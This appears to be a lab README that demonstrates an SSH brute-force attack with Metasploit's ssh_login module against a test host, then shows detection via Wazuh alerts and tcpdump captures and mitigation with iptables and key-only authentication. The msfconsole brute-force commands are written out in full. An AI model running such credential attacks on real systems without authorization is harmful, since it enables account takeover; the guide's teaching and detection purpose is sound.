# SSH-Brute-Force-Attack-using-Metasploit-with-Threat-Detection-via-Wazuh
Demonstrate an SSH brute-force attack using Metasploit’s ssh_login module, verify access, observe the attack with network captures and Wazuh alerts, and apply immediate mitigation (iptables). This is a lab/demo guide to understand attack mechanics and detection.
# Tools & Environment

Attacker: Kali Linux (msfconsole / Metasploit). (Example IP: 192.168.1.69)

Victim: Ubuntu/Linux with SSH enabled (Example IP: 192.168.1.71, port 22).

Monitoring: Wazuh (log-based detection) and Wireshark / tcpdump (network captures).

Client: ssh / PuTTY to verify credentials.

Mitigation: iptables for quick host-based blocking.

# Quick background

SSH (Secure Shell) provides encrypted remote access (default port 22). Encryption protects session contents, but weak passwords remain a major risk.

Metasploit provides an auxiliary/scanner/ssh/ssh_login module that automates trying username/password pairs against SSH services—useful for testing and demonstration.

# Project objective

Use Metasploit to brute-force SSH credentials on a lab victim, confirm access, show how Wazuh and packet captures reveal the attack, and block the attacking IP.

# Step-by-step (attack & verification)

Prepare credential lists on Kali

/root/user.txt — candidate usernames (one per line)

/root/passwords.txt — candidate passwords (one per line)

# Launch Metasploit

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.71
set RPORT 22
set USER_FILE /root/user.txt
set PASS_FILE /root/passwords.txt
run


run will iterate combos and print successes (e.g., Success: cisco:password123).

Verify access

ssh cisco@192.168.1.71
# enter discovered password
echo "Proof: accessed via Metasploit test" > attacked.txt


Creating attacked.txt (or similar) proves you had interactive access in the lab.

# Detection & Monitoring
Wazuh (log-based)

Configure Wazuh to monitor SSH logs (/var/log/auth.log or /var/log/secure).

Alerts to expect:

Repeated Failed password entries from the same source IP → brute-force pattern.

An eventual Accepted password/authentication success → compromise.

PAM session open/close entries if PAM is used.

Recommend rule tuning to alert when failures exceed a threshold within a time window.

Network analysis (Wireshark / tcpdump)

SSH is encrypted, so payloads aren’t readable, but metadata and connection patterns are revealing.

Capture example:

sudo tcpdump -i eth0 -s 0 -w ssh_attack.pcap port 22


Indicators to look for:

High rate of short-lived TCP connections from one IP to port 22.

Many TCP connection attempts and resets within a short time window.

A successful session after many failures — correlate timestamps with msfconsole output.

Use Wireshark statistics (Conversations / Endpoints) to find the top talkers.

# Mitigation
Immediate (host block)

Block attacker IP:

sudo iptables -A INPUT -s <ATTACKER_IP> -p tcp --dport 22 -j DROP
sudo iptables -L INPUT -v -n   # verify rule present


Script example:

# block_ssh.sh
#!/bin/bash
if [[ $EUID -ne 0 ]]; then echo "Run as root"; exit 1; fi
iptables -A INPUT -s "$1" -p tcp --dport 22 -j DROP

# Longer-term defenses

Disable password auth: enforce SSH key-based authentication (PasswordAuthentication no in sshd_config).

Use fail2ban / sshguard: automatic temporary bans for repeated failures.

Restrict access: allow SSH only from trusted management IPs (iptables or firewall rules).

Strong credentials & rotation: enforce complex passwords if password auth must remain.

Centralized logging / SIEM: aggregate logs for cross-host correlation and alerting.

Safety & ethics

Run these steps only in a controlled lab or with explicit authorization. Unauthorized attacks or testing on production/public systems is illegal and unethical.

# Summary

Metasploit’s ssh_login module makes it simple to illustrate SSH brute-force attacks. Wazuh alerts (log-based) and network captures (Wireshark/tcpdump) both reveal different facets of the attack — use both for robust detection. Immediate iptables rules block the source; long-term protection relies on key-only auth, automatic banning tools, and restricted access.
